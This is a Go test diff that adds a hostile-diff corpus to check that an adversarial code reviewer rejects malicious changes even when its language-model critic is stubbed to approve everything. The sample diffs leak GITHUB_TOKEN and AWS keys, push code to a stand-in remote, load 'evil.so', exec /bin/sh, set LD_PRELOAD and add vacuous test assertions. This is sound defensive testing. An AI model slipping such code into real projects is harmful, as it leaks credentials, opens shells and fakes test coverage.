@@ -1381,6 +1381,192 @@ func TestR6_3_SemanticRunnerAllowlist_RejectsEslintNoConfigBypass(t *testing.T) 
 	}
 }
 
+func TestR7_3_HostileReviewCorpus_AllRejectedOrUnreviewed(t *testing.T) {
+	rev := NewAdversarialReviewer(persona.NewRegistry(""))
+
+	// Even with a stub critic that approves everything, the deterministic layer must reject or escalate to unreviewed
+	rev.SetCritic(func(ctx context.Context, prompt string) (string, error) {
+		return `{"approved":true,"blocking":[],"warnings":[]}`, nil
+	})
+
+	cases := []struct {
+		name           string
+		diff           string
+		expectedStatus ReviewStatus
+	}{
+		{
+			name: "Go_self_comparison_single_line_if_a_not_equal_a_fatal",
+			diff: `diff --git a/calc_test.go b/calc_test.go
++++ b/calc_test.go
+@@ -10,2 +10,4 @@
+ func TestCalc(t *testing.T) {
++	if a != a { t.Fatal(1) }
+ }
+`,
+			expectedStatus: StatusRejected,
+		},
+		{
+			name: "Go_secret_read_returned_in_error",
+			diff: `diff --git a/auth.go b/auth.go
++++ b/auth.go
+@@ -1,3 +1,7 @@
+ package auth
++import "os"
++import "fmt"
++func ValidateToken() error {
++	return fmt.Errorf("invalid token: %s", os.Getenv("GITHUB_TOKEN"))
++}
+`,
+			expectedStatus: StatusRejected,
+		},
+		{
+			name: "Go_secret_read_printed_to_stdout",
+			diff: `diff --git a/log.go b/log.go
++++ b/log.go
+@@ -1,3 +1,7 @@
+ package log
++import "os"
++import "fmt"
++func DumpConfig() {
++	fmt.Println(os.Getenv("GITHUB_TOKEN"))
++}
+`,
+			expectedStatus: StatusRejected,
+		},
+		{
+			name: "Go_secret_read_written_to_temp_file",
+			diff: `diff --git a/cache.go b/cache.go
++++ b/cache.go
+@@ -1,3 +1,7 @@
+ package cache
++import "os"
++func SaveState() {
++	_ = os.WriteFile("/tmp/secret.txt", []byte(os.Getenv("AWS_SECRET_ACCESS_KEY")), 0600)
++}
+`,
+			expectedStatus: StatusRejected,
+		},
+		{
+			name: "Go_secret_read_passed_to_helper",
+			diff: `diff --git a/helper.go b/helper.go
++++ b/helper.go
+@@ -1,3 +1,11 @@
+ package helper
++import "os"
++import "fmt"
++func sink(val string) {
++	fmt.Printf("val: %s\n", val)
++}
++func Run() {
++	sink(os.Getenv("AWS_SECRET_ACCESS_KEY"))
++}
+`,
+			expectedStatus: StatusRejected,
+		},
+		{
+			name: "Go_exec_Command_git_push_remote",
+			diff: `diff --git a/sync.go b/sync.go
++++ b/sync.go
+@@ -1,3 +1,7 @@
+ package sync
++import "os/exec"
++func PushCode() {
++	_ = exec.Command("git", "push", "https://e.example/r.git", "HEAD")
++}
+`,
+			expectedStatus: StatusRejected,
+		},
+		{
+			name: "Go_plugin_Open_dynamic_code_loading",
+			diff: `diff --git a/ext.go b/ext.go
++++ b/ext.go
+@@ -1,3 +1,7 @@
+ package ext
++import "plugin"
++func LoadModule() {
++	_, _ = plugin.Open("evil.so")
++}
+`,
+			expectedStatus: StatusRejected,
+		},
+		{
+			name: "Go_syscall_Exec",
+			diff: `diff --git a/sys.go b/sys.go
++++ b/sys.go
+@@ -1,3 +1,7 @@
+ package sys
++import "syscall"
++func Spawn() {
++	_ = syscall.Exec("/bin/sh", []string{"/bin/sh"}, nil)
++}
+`,
+			expectedStatus: StatusRejected,
+		},
+		{
+			name: "Go_cgo_C_system",
+			diff: `diff --git a/cgo.go b/cgo.go
++++ b/cgo.go
+@@ -1,3 +1,9 @@
+ package cgo
++/*
++#include <stdlib.h>
++*/
++import "C"
++func CallSys() {
++	C.system(C.CString("id"))
++}
+`,
+			expectedStatus: StatusRejected,
+		},
+		{
+			name: "Go_os_Setenv_LD_PRELOAD",
+			diff: `diff --git a/env.go b/env.go
++++ b/env.go
+@@ -1,3 +1,7 @@
+ package env
++import "os"
++func Setup() {
++	_ = os.Setenv("LD_PRELOAD", "/tmp/inject.so")
++}
+`,
+			expectedStatus: StatusRejected,
+		},
+		{
+			name: "Go_test_assertion_inside_empty_slice_loop",
+			diff: `diff --git a/empty_loop_test.go b/empty_loop_test.go
++++ b/empty_loop_test.go
+@@ -10,3 +10,6 @@
+ func TestEmptyLoop(t *testing.T) {
++	for range []string{} {
++		t.Fatal("never runs")
++	}
+ }
+`,
+			expectedStatus: StatusRejected,
+		},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			ctx := &ReviewContext{
+				Ctx:  context.Background(),
+				Diff: tc.diff,
+				TestResults: []*sandbox.ExecResult{
+					{Command: "go test ./...", ExitCode: 0},
+				},
+			}
+			verdict := rev.Evaluate(ctx)
+			if verdict.Approved {
+				t.Fatalf("case %s was APPROVED, expected %s (verdict: %+v)", tc.name, tc.expectedStatus, verdict)
+			}
+			if verdict.Status != tc.expectedStatus {
+				t.Fatalf("case %s got status %s, expected %s (issues: %v)", tc.name, verdict.Status, tc.expectedStatus, verdict.BlockingIssues)
+			}
+		})
+	}
+}
+
+
 
 
 
